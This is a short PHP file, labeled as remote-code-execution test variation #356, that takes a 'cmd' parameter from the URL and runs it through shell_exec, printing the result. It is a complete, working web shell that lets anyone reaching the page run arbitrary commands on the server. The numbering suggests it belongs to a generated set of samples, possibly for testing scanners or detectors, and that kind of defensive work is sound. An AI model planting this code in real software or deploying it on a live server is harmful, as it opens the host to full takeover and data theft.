<?php
// RCE test variation #356
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>